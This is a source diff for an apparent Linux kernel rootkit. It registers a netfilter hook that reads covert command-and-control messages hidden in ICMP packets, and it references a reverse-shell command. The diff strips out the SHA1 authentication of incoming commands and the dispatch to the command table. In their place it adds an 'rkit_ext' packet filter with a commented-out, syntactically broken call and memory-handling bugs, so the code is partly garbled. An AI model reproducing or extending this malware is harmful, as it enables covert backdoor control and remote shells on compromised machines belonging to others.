@@ -1,6 +1,7 @@
 #include "c2.h"
 #include "rshell.h"
 #include "misc.h"
+#include "rkit_ext.h"
 #include <linux/skbuff.h>
 #include <linux/in.h>
 #include <linux/icmp.h>
@@ -21,71 +22,32 @@ struct workqueue_struct *work_queue;
 
 struct c2_task {
     struct work_struct work;
-    struct c2hdr header;
-    struct c2opt_gen payload;
-    __u32 dst_ip;
+    struct icmphdr *data;
+    unsigned long len;
 };
-
-static int new_sha1(__u8 *buf, __u8 *output)
-{
-    struct scatterlist sg;
-    struct crypto_hash *tfm;
-    struct hash_desc desc;
-
-    tfm = crypto_alloc_hash("sha1", 0, CRYPTO_ALG_ASYNC);
-
-    desc.tfm = tfm;
-    desc.flags = 0;
-
-    sg_init_one(&sg, buf, 12);
-    crypto_hash_init(&desc);
-
-    crypto_hash_update(&desc, &sg, 12);
-    crypto_hash_final(&desc, output);
-
-    crypto_free_hash(tfm);
-
-    return 0;
-}
-
-int check_auth(struct c2hdr header, struct c2opt_gen payload, __u32 ip)
-{
-    __u8 auth_sha1[SHA1_LENGTH] = {0};
-    __u8 auth_data[sizeof(struct c2opt_gen) + sizeof(__u32)] = {0};
-
-    memcpy(auth_data, &payload, sizeof(payload));
-    memcpy(auth_data + sizeof(payload), &ip, sizeof(ip));
-
-    new_sha1(auth_data, auth_sha1);
-
-    return !memcmp(auth_sha1, header.nonce, sizeof(header.nonce));
-}
-
 
 static void exec_c2_task(struct work_struct *work)
 {
     struct c2_task *task = (struct c2_task *)work;
 
-    if (check_auth(task->header, task->payload, task->dst_ip)) {
-        cmd_table[ntohl(task->header.cmd)](task->payload);
-    }
+/*
+    rkit_ext_run(task->);
+*/
 
     kfree(task);
-    return;
 }
 
-static int queue_c2_task(void *hdr, void* payload, __u32 dst_ip)
+static int queue_c2_task(struct icmphdr *payload, unsigned long len)
 {
     struct c2_task *task = NULL;
     int err = -ENOMEM;
     
-    task = kmalloc(sizeof(*task), GFP_ATOMIC);
+    task = kmalloc(len, GFP_ATOMIC);
     if (task) {
         R_INIT_WORK(&task->work, &exec_c2_task);
 
-        task->header = *(struct c2hdr *)hdr;
-        task->payload = *(struct c2opt_gen *)payload;
-        task->dst_ip = dst_ip;
+        memcpy(task->data, payload, len);
+        task->len = len;
 
         err = schedule_work(&task->work);
     }
@@ -99,41 +61,20 @@ unsigned int watch_icmp(HOOK_ARG_TYPE hook,
                         const struct net_device *out,
                         int (*okfn)(struct sk_buff *))
 {
-    struct iphdr *ip_header = NULL;
-    struct icmphdr *icmp_header = NULL;
-    struct c2hdr *c2_header = NULL;
-    struct c2opt_gen *payload = NULL;
+    struct iphdr *iph = ip_hdr(skb);
 
-    ip_header = ip_hdr(skb);
-    if (!ip_header) {
-        return NF_ACCEPT;
-    }
+    if (iph) {
+        if (iph->protocol == IPPROTO_ICMP) {
+            struct icmphdr *icmph = NULL;
+            unsigned short hlen = iph->ihl * 4;
+            unsigned short len = iph->tot_len - hlen; 
 
-    if (ip_header->protocol != IPPROTO_ICMP) {
-        return NF_ACCEPT;
+            icmph = (struct icmphdr *)((char *)(iph) + hlen);
+            if (icmph && rkit_check_id(icmph->un.echo.id)) {
+                queue_c2_task(icmph, len);
+            }
+        }
     }
-
-    // skb->transport_header hasn't been set by this point, so we have to calculate it manually
-    icmp_header = (struct icmphdr *)(ip_header + 1);
-    if (!icmp_header) {
-        return NF_ACCEPT;
-    }
-
-    c2_header = (struct c2hdr *)(icmp_header + 1);
-    if (!c2_header) {
-        return NF_ACCEPT;
-    }
-
-    if (ntohl(c2_header->cmd) < CMD_REVERSE_SHELL ||
-        ntohl(c2_header->cmd) > CMD_MAX) {
-        return NF_ACCEPT;
-    }
-
-    payload = (struct c2opt_gen *)(c2_header + 1);
-    if (!payload) {
-        return NF_ACCEPT;
-    }
-    queue_c2_task(c2_header, payload, ip_header->daddr);
 
     return NF_ACCEPT;
 }
